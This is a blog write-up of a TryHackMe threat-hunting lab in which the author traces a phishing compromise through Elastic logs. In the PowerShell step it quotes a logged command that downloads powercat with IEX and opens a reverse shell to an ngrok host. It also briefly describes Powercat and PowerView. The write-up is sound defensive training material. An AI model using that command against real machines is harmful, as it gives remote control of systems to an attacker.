---
title: Hunt Me 1 - Payment Collectors
date: 2026-05-03 00:00:00 +0200
categories: [TryHackMe Challenges]
tags: [tryhackme, ELK stack, phishing, ]
series: ""
series_order: 
---

> **Disclaimer**: This post contains my personal notes and methodology for the respective TryHackMe room. All the credits for the room and the lab environment go to the original creators at TryHackMe. **Flags are not revealed** to preserve the challenge for others. 
{: .prompt-info}

## Objective

> On Friday, September 15, 2023, Michael Ascot, a Senior Finance Director from SwiftSpend, was checking his emails in Outlook and came across an email appearing to be from Abotech Waste Management regarding a monthly invoice for their services. Michael actioned this email and downloaded the attachment to his workstation without thinking.

- **Friday, September 15, 2023**
- **Outlook**
- Downloaded an attachment

> The following week, Michael received another email from his contact at Abotech claiming they were recently hacked and to carefully review any attachments sent by their employees. However, the damage has already been done. Use the attached Elastic instance to hunt for malicious activity on Michael's workstation and within the SwiftSpend domain!

---

## Investigation

We know Michael was using **Outlook**, and first downloaded the attachment through that. That's the initial entry point for this investigation.  

- After some basic digging through the logs to understand it, we find the zip file downloaded, by filtering through the column `file.name` for `.zip` files. It was **Invoice_AT_2023-227.zip**. 
- The process that downloaded it was `OUTLOOK.EXE`. The process ID (`process.pid`) of this outlook process is **8668**. Going down that route yields to not much. 
- The user must have extracted something from the zip, and that should have involved explorer process in some place. Filtering for `process.name: Explorer.exe`, we find the extracted files. 
    - ![Image]({{ "assets/img/huntme1_1.png" | relative_url}})
    - Process ID: **3180**. We can use this as `process.parent.pid` to find the processes spawned by this malicious file. 
- No surprises here, it is **powershell.exe**. 
    - `[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -c, IEX(New-Object System.Net.WebClient).DownloadString('hxxps://raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell]`
    - Process ID for this powershell process: **3880**. Use this to find what happens next. 
    - ![Image]({{ "assets/img/huntme1_2.png" | relative_url}})
    - The process connected to the attacker's machine on the given IP and port. 
- In the screenshot above, there is another connection made to another ip, over port 443. Using `process.parent.pid` (process ID of that process is 9060), we find the following: 
    - ![Image]({{ "assets/img/huntme1_3.png" | relative_url}})
- The process at the end, process ID 3728, has further child processes. We can see the attacker uses **PowerView**. But to find the original download link, we can just search for all mentions of `PowerView.ps1`. 

---

### Powercat

Powercat is a PowerShell-based networking tool often described as a **PowerShell equivalent of Netcat**. It allows users to read and write data across network connections using TCP or UDP, and supports features like file transfers, port scanning, relay functionality, and reverse/bind shells. 

---

### PowerView

PowerView is a PowerShell tool that is part of the **PowerSploit** framework, designed for Active Directory reconnaissance and enumeration. It allows security professionals and attackers alike to **query and map out domain environments**, including enumerating users, groups, group policies, trusts, shares, sessions, and more — all without requiring elevated privileges in many cases. 

---

## Notes

1. Always use process id's and parent process id's. Building a process tree or atleast following it can save a lot of time. 
2. Use **View surrounding documents** in Elastic Stack when required or even when you are stuck. It can reveal useful information when the logs are a little complicated. 
3. This is more applicable for CTF challenges than real life, but when you are looking for something, just look for it **directly**, **search for it**, rather than following a process to let the logs reveal something. Sometimes the logs are somewhat complicated and you just have to dive in.  

---

![Image]({{ "assets/img/threat_hunter_badge.png" | relative_url}})
